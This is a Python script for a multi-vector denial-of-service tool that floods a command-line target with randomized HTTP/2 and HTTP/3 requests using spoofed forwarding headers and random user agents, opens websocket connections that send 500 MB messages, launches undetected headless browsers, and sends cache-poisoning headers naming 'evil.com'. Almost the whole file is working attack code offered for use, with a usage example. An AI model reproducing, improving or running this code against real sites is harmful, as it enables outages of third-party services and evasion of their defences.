import random
import socket
import threading
import time
import sys
import ssl
import requests
import httpx
import asyncio
import websockets
import dns.resolver
import undetected_chromedriver as uc
from fake_useragent import UserAgent
import base64

ua = UserAgent()
packet_count = 0
lock = threading.Lock()

def random_ip():
    return f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 255)}"

def stealth_headers():
    return {
        "User-Agent": ua.random,
        "X-Forwarded-For": random_ip(),
        "X-Real-IP": random_ip(),
        "VIA": random_ip(),
        "Referer": random.choice(["https://google.com", "https://bing.com", "https://yahoo.com"]),
        "Accept-Encoding": "gzip, deflate",
        "Connection": "keep-alive"
    }

async def http2_http3_randomization(target, stop_event):
    global packet_count
    async with httpx.AsyncClient(http2=True) as client:
        while not stop_event.is_set():
            try:
                version = random.choice(["http1.1", "http2", "http3"])
                headers = stealth_headers()
                if version == "http3":
                    headers["Alt-Svc"] = 'h3=":443"; ma=86400'
                await client.get(f"https://{target}", headers=headers, timeout=5, verify=False)
                with lock:
                    packet_count += 5
            except:
                pass

def cache_poisoning_attack(target):
    global packet_count
    payloads = [
        {"X-Original-URL": "/malicious_path"},
        {"X-Forwarded-Host": "evil.com"},
        {"Cache-Control": "no-cache, must-revalidate"},
        {"Pragma": "no-cache"}
    ]
    for payload in payloads:
        try:
            requests.get(f"https://{target}", headers=payload, timeout=5)
            with lock:
                packet_count += 5
        except:
            pass

def detect_load_balancer(target):
    try:
        resolver = dns.resolver.Resolver()
        answers = resolver.resolve(target, "A")
        ips = set([str(ip) for ip in answers])
        if len(ips) > 1:
            print(f"[!] Load Balancer Detected: {ips}")
        else:
            print("[✔] No Load Balancer Detected.")
    except:
        print("[!] Unable to detect Load Balancer.")

def headless_browser_attack(target):
    try:
        driver = uc.Chrome()
        driver.get(f"https://{target}")
        time.sleep(5)
        driver.quit()
    except:
        pass

async def websocket_flood(target, stop_event):
    global packet_count
    while not stop_event.is_set():
        try:
            async with websockets.connect(f"wss://{target}") as ws:
                while not stop_event.is_set():
                    await ws.send("X" * (1024 * 500000))
                    with lock:
                        packet_count += 5
        except:
            pass

def encrypted_payload(target):
    payload = "GET / HTTP/1.1\r\nHost: {}\r\nUser-Agent: {}\r\n\r\n".format(target, ua.random)
    encoded_payload = base64.b64encode(payload.encode()).decode()
    return encoded_payload

def monitor():
    while True:
        with lock:
            print(f"[INFO] Status: Running | Packets Sent: {packet_count} | Active Threads: {threading.active_count() - 1}")
        time.sleep(2)

def attack(target, port, threads):
    stop_event = threading.Event()
    thread_list = []

    print("[*] Checking for Load Balancer...")
    detect_load_balancer(target)

    print("[*] Starting Cache Poisoning Attack...")
    cache_poisoning_attack(target)

    print("[*] Launching HTTP/2 & HTTP/3 Randomized Requests...")

    # Monitoring Thread
    monitor_thread = threading.Thread(target=monitor, daemon=True)
    monitor_thread.start()

    for _ in range(threads):
        t1 = threading.Thread(target=asyncio.run, args=(http2_http3_randomization(target, stop_event),))
        t2 = threading.Thread(target=headless_browser_attack, args=(target,))
        t3 = threading.Thread(target=asyncio.run, args=(websocket_flood(target, stop_event),))
        t1.start()
        t2.start()
        t3.start()
        thread_list.append(t1)
        thread_list.append(t2)
        thread_list.append(t3)

    print("\n[*] Attack is running. Press ENTER to stop.\n")
    input()
    stop_event.set()
    
    for t in thread_list:
        t.join()

    print("\n[✔] Attack stopped.")

def main():
    if len(sys.argv) < 3:
        print("\nUsage: python main.py <target> <threads>\n")
        print("Example: python main.py example.com 100\n")
        sys.exit(1)

    target = sys.argv[1]
    threads = int(sys.argv[2])

    port = 80

    print(f"\n[*] Target: {target}")
    print(f"[*] Port: {port} (Default HTTP)")
    print(f"[*] Threads: {threads}\n")

    attack(target, port, threads)

if __name__ == "__main__":
    main()